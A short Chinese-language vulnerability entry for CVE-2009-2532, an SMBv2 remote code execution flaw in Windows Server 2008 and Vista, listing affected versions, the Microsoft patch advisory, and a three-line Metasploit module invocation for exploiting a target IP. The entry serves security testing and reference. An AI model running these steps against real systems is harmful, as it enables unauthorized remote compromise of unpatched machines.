### CVE-2009-2532

#### 描述

无法正确处理SMB多协议协商请求数据包中的命令值，这使远程攻击者可以通过精心制作的SMBv2执行任意代码 数据包发送到服务器服务

#### 影响版本

| Product             | Version | Update | Edition | Tested |
| ------------------- | ------- | ------ | ------- | ------ |
| Windows Server 2008 | -       |        |         |        |
| Windows Server 2008 | -       | SP2    |         |        |
| Windows Server 2008 | -       | SP2    | Itanium |        |
| Windows Server 2008 | -       | SP2    | X64     |        |
| Windows Server 2008 | -       | SP2    | X86     |        |
| Windows Server 2008 |         |        | Itanium |        |
| Windows Server 2008 |         |        | X32     |        |
| Windows Server 2008 |         |        | X64     |        |
| Windows Vista       | -       | SP1    |         |        |
| Windows Vista       | -       | SP2    |         |        |
| Windows Vista       |         |        | X64     |        |
| Windows Vista       |         | SP1    | X64     |        |
| Windows Vista       |         | SP2    | X64     |        |
| Windows Vista       |         |        |         |        |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2009-2532
```

#### 利用方式

利用msf 测试系统windows server 2008 sp2 x86

```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 192.168.1.13 #目标IP
run
```

![image-20200823134421895](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2009-2532_win2008_x86_msf.png?raw=true)